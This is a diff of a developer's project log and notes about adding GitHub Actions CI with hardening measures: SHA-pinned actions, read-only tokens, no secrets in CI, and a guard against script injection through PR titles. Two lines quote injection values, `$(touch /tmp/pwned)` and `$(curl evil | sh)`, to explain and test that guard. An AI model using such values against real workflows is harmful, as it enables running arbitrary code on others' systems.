@@ -34,9 +34,9 @@ Update this as the project grows.
 | Largest exact amount in JavaScript | ≈ ₹90 lakh crore in paise (2^53) | ADR 0008 |
 | Business types in v1 | 5 | Module 00 |
 | Modules | 10 (00–09) | `docs/requirements/` |
-| ADRs | 23 (16 at kickoff) | `docs/decisions/` |
+| ADRs | 24 (16 at kickoff) | `docs/decisions/` |
 | Secrets found before going public | 0, in 5 commits (gitleaks, full history) | ADR 0017 |
-| Automated tests | 121: 65 unit (45 money helpers, 20 API config, error, process and shutdown) + 20 integration on a real PostgreSQL (roles and grants, database client, health endpoints and headers, worker startup) + 36 web (routing, connection badge, the three languages, error screen) | `pnpm test` |
+| Automated tests | 127: 71 unit (45 money helpers, 20 API config, error, process and shutdown, 6 migration-order check) + 20 integration on a real PostgreSQL (roles and grants, database client, health endpoints and headers, worker startup) + 36 web (routing, connection badge, the three languages, error screen) | `pnpm test` |
 | Interface languages | 3: English, Hindi, Hinglish (`en`, `hi`, `hi-Latn`) | Module 00 #25, ADR 0023 |
 | Web app download | ~122 KB gzipped JavaScript (383 KB raw); web image 93 MB (Caddy) | P0.5, `vite build` |
 | PostgreSQL version | 18, everywhere (newest RDS supports) | ADR 0005, `compose.yaml` |
@@ -45,6 +45,8 @@ Update this as the project grows.
 | API Docker image | 375 MB, of which the app is 40 MB (the rest is `node:24-slim`) | P0.4 |
 | First image build on a slow connection | ~12 minutes (later builds reuse the cached install layer) | P0.4 |
 | Clean stop of api and worker | ~0.7 s, exit code 0 | P0.4 |
+| CI checks on every pull request | 5 required: `check`, `secrets`, `migrations`, `smoke`, `pr-title` | ADR 0024 |
+| CI run time | ~3 min in all; `check` (lint, types, 127 tests, build) 47 s; `smoke` 2 min 47 s with an empty cache, 50 s warm | P0.6 |
 | How often the screen checks the server | every 30 s, 10 s timeout (the API waits 5 s for the database) | P0.5, ADR 0001 |
 
 ---
@@ -117,6 +119,13 @@ Short answers; the Log entry has the full story.
 - **Q: How do you choose timeouts across layers?**
   A: Each caller waits longer than what it calls. The API waits 5 s for the database, so the browser waits 10 s. Otherwise a database outage can be reported as "server down", depending on which timer fires first. A test pins the relationship.
 
+- **Q: What does your CI pipeline check?**
+  A: Five required checks on every PR: lint, types, all tests against a real PostgreSQL and the build; a gitleaks scan of the whole history; a check that a new migration is newer than `main`'s (Drizzle skips older ones); the PR title; and a smoke test that builds the real images with a layer cache, starts them with Compose and checks headers, a failing migration and clean shutdowns. → ADR 0024
+- **Q: How do you secure a GitHub Actions workflow?**
+  A: Read-only token permissions, actions pinned to commit SHAs (tags can be moved, as in the tj-actions attack), no `pull_request_target`, no secrets in CI at all, `persist-credentials: false`, and event values like a PR title passed through `env:` rather than `${{ }}` inside a script, which would be script injection. → ADR 0024
+- **Q: How do you know a CI check actually works?**
+  A: I made each one fail on purpose: a badly formatted line, a fake API key, a wrong expected header and a bad PR title. I did it on a throwaway branch, because a fake secret committed to the real branch would stay in history and fail every later scan. → P0.6
+
 ---
 
 ## Glossary
@@ -132,6 +141,7 @@ Terms I learned on this project, in one line each.
 | BOM | Byte-order mark: invisible bytes at the start of a text file; JSON parsers reject it, and PowerShell 5.1's "utf8" adds it |
 | Cache busting | Putting a hash of a file's content in its name, so a changed file gets a new URL and old copies can be cached forever |
 | Catalog (pnpm) | One list of dependency versions in `pnpm-workspace.yaml` that every package refers to with `"catalog:"` |
+| Branch protection: up to date | A rule that a PR must contain the latest `main` before merging, so its checks ran against what it will actually join |
 | CI / CD | Continuous Integration (test every change automatically) / Continuous Deployment (ship every green change automatically) |
 | Container | A running, disposable copy of an image, isolated from the rest of the computer |
 | Conventional Commits | Commit messages shaped `type(scope): summary`, e.g. `fix(gst): round CGST and SGST separately` |
@@ -179,6 +189,10 @@ Terms I learned on this project, in one line each.
 | Supply-chain attack | Attacking an app through something it depends on, e.g. publishing a poisoned version of a popular npm package |
 | TDD | Test-driven development: write a failing test, watch it fail, write the least code that passes, then tidy up |
 | Tenant | One customer business in a multi-tenant system |
+| Required status check | A CI job that must pass before GitHub lets a pull request merge; set in the branch ruleset |
+| Script injection (Actions) | Writing `${{ github.event... }}` inside `run:` pastes user-typed text into a shell script, which then runs it; pass it through `env:` instead |
+| SHA pinning | Referring to an action by its full commit hash instead of a tag, so its code can't change without a visible edit |
+| Smoke test | A quick check that the real built thing starts and answers, before deeper testing or a deploy |
 | Testcontainers | A library that starts real throwaway services (here PostgreSQL) in Docker for a test run |
 | Text shaping | Turning letters into correctly joined glyphs; Hindi (Devanagari) needs it for conjuncts like क्ष |
 | Type-aware linting | Lint rules that use the TypeScript compiler's type information, e.g. "this promise is never awaited" |
@@ -753,3 +767,45 @@ Entry format:
 - **Why / what I learned:** Validating config at build time turns a broken web server into a failed build instead of a broken deploy. A fault can be simulated in a running container without changing the image.
 - **Say it in an interview:** "My Dockerfile runs `caddy validate`, so a bad web-server config fails the build, not the deploy. To test the error screen I removed a JavaScript chunk from the running container and loaded the page in headless Chrome."
 - **Follow-ups to expect:** Why hide `X-Powered-By`? (It's not a vulnerability itself, but it tells attackers which framework's known bugs to try. It costs nothing to remove.)
+
+### 2026-10-31 — DevOps stage 3: CI with five required checks `#devops` `#github` → ADR 0024
+- **What happened:** I added GitHub Actions. `ci.yml` runs four jobs in parallel on Ubuntu: `check` (format, lint, types, all tests, build, actionlint), `secrets` (gitleaks over the whole history), `migrations` (a new migration must be newer than `main`'s) and `smoke` (build both images, `docker compose up --wait`, then `scripts/ci/smoke.sh`). `pr-title.yml` checks the title. All five are required in the `protect-main` ruleset. Everything passed on the first run, including the Testcontainers integration tests and the stop-signal checks that Windows can't run.
+- **Why / what I learned:** CI is a clean machine that doesn't share my laptop's leftovers, so "works on my machine" becomes "works". Logic longer than a line lives in scripts I can run locally, so a red build is reproducible. `pr-title` is a separate workflow because renaming a PR (`edited`) shouldn't re-run, or cancel, the whole build.
+- **Say it in an interview:** "Every PR runs five required checks, including a smoke test that boots the real images with Compose and checks headers, a failing migration and clean shutdowns. Each check is a script I can also run locally."
+- **Follow-ups to expect:** Why not Jenkins? (It needs a server to run, pay for and patch; ADR 0012.) Why Testcontainers instead of a `services:` database? (Same setup as the laptop, including the roles bootstrap script.)
+
+### 2026-10-31 — Securing the workflows: SHA pins, read-only token, no secrets `#security` `#devops` → ADR 0024
+- **What happened:** Every action is pinned to a 40-character commit SHA with the version in a comment. Dependabot opens one grouped PR a month to update them. The workflow token is `contents: read`, checkout doesn't keep the token (`persist-credentials: false`), and CI uses no secrets at all: the smoke test copies `.env.example`'s fake passwords for a throwaway database.
+- **Why / what I learned:** In March 2025, attackers moved the tags of `tj-actions/changed-files` to code that printed CI secrets into public logs. Anyone using a version tag ran it; anyone pinned to a SHA didn't. A tag is a movable pointer, a SHA isn't.
+- **Say it in an interview:** "I pin actions to commit SHAs because tags can be repointed, as the tj-actions attack showed, and Dependabot keeps the pins fresh. My CI has a read-only token and no secrets, so a hijacked step has nothing to steal."
+- **Follow-ups to expect:** What's `pull_request_target` and why avoid it? (It runs with the base repo's token and secrets; checking out the PR's code there runs a stranger's code with your rights.)
+
+### 2026-10-31 — Script injection: a PR title is code if you let it be `#security` `#gotcha`
+- **What happened:** The PR-title check reads the title from `env: PR_TITLE: ${{ github.event.pull_request.title }}`, never from `${{ }}` written inside `run:`. I tested the script with a title made of `$(touch /tmp/pwned)`, the same in backticks, and quotes: it was rejected as text and no file appeared.
+- **Why / what I learned:** GitHub replaces `${{ }}` before the shell starts, so a title written straight into a script becomes part of the script. Through `env:`, the shell only ever sees it as a variable's value. The bash regex is also kept in a variable, and the title is never `eval`ed.
+- **Say it in an interview:** "Anyone can name a pull request `$(curl evil | sh)`. If a workflow pastes the title into a shell script with `${{ }}`, that runs. I pass it through an environment variable, so it's only ever data."
+- **Follow-ups to expect:** Which other fields are risky? (Anything a user types: issue and PR titles and bodies, branch names, commit messages, comment text.)
+
+### 2026-10-31 — Proving each check can fail, without polluting history `#testing` `#git` `#process`
+- **What happened:** A check that has never failed proves nothing, so I broke each one on purpose: a badly formatted line (`check`), a fake API key (`secrets`, which printed it as `REDACTED`), a wrong expected header (`smoke`, which then printed every container's logs), and a PR renamed to `CI: Add workflows.` (`pr-title`). The first three went on a throwaway branch, run with `gh workflow run ci.yml --ref <branch>`, which I then deleted. The migration check's failure was shown locally with a hand-edited journal.
+- **Why / what I learned:** Committing the fake key to the PR branch and reverting it wouldn't have worked: a revert adds a commit, the key stays in history, and every later full-history gitleaks scan would fail. Removing it would need a force-push, which the project forbids.
+- **Say it in an interview:** "I proved each CI check could go red by planting a failure for it. I put the fake secret on a throwaway branch, because a revert doesn't remove it from history and the secrets scan reads the whole history."
+- **Follow-ups to expect:** How would you silence a known false positive in gitleaks? (A `.gitleaksignore` entry with the finding's fingerprint, reviewed like code.)
+
+### 2026-10-31 — The Docker layer cache in CI: measure it `#devops` `#gotcha` `#cost`
+- **What happened:** The smoke job builds the images with `docker/build-push-action` and the GitHub Actions cache (`type=gha`, `mode=max`). First run, empty cache: 2 min 47 s. A re-run of the same commit: 50 s, with every layer `CACHED`. On the throwaway branch, though, nothing was cached, and exporting the cache took 73 s while the `pnpm install` it saves took only 6 s.
+- **Why / what I learned:** GitHub's cache is scoped by branch: a run can read its own branch's cache and `main`'s, never a sibling branch's. So PRs benefit once `main` has a cache. On GitHub's fast network the install that took 12 minutes on my laptop takes 6 s, so the cache's real win is skipping the TypeScript and Vite builds and the image export, not the download. `mode=max` is needed to cache the build stage, not just the final image.
+- **Say it in an interview:** "I measured my CI cache instead of assuming: cold 2 min 47 s, warm 50 s. I also found GitHub scopes caches by branch, so a new branch only gets `main`'s cache."
+- **Follow-ups to expect:** Why are Dockerfile layers ordered manifests-first? (The install layer is reused until a dependency changes; only the source-copy layers rebuild on a code change.)
+
+### 2026-10-31 — Required checks: up to date with `main`, and only from GitHub Actions `#github` `#security` → ADR 0024
+- **What happened:** I added a `required_status_checks` rule to `protect-main` with `gh api --method PUT`, sending the existing ruleset plus the new rule, after saving a copy of the old JSON. Each check is bound to the GitHub Actions app (id 15368), and *Require branches to be up to date* is on.
+- **Why / what I learned:** Without the app binding, any integration with status-write access could post a green `check`. Without "up to date", the `migrations` check could have run against an older `main`. If `main` gains a migration afterwards, the PR's green check is stale, which is exactly Drizzle's skip trap. Required checks can only be picked once they've run at least once, so GitHub knows their names.
+- **Say it in an interview:** "My required checks must come from GitHub Actions and run against the latest `main`. That second rule matters because my migration-order check is only meaningful against the current `main`."
+- **Follow-ups to expect:** What's the cost of "up to date"? (When `main` moves, every open PR needs an update and a re-run; fine for a solo project, and merge queues solve it for big teams.)
+
+### 2026-10-31 — My own last PR title would have failed the new check `#git` `#mistake`
+- **What happened:** Before turning the PR-title check on, I ran it against every title already on `main`. P0.5's, `chore: build the react web skeleton with caddy and three languages (P0.5)`, has 73 characters, one over the 72 limit in my own git-workflow doc. Only the two titles from before the convention also failed.
+- **Why / what I learned:** A written rule nobody checks drifts. Running a new check against past data shows whether the rule is realistic before it starts blocking people.
+- **Say it in an interview:** "I back-tested my PR-title check against the existing history. It caught one of my own titles, one character too long, which showed why the rule needed automating."
+- **Follow-ups to expect:** Why 72 characters? (Git tools and GitHub's UI truncate longer subject lines; 72 leaves room for indentation in `git log`.)
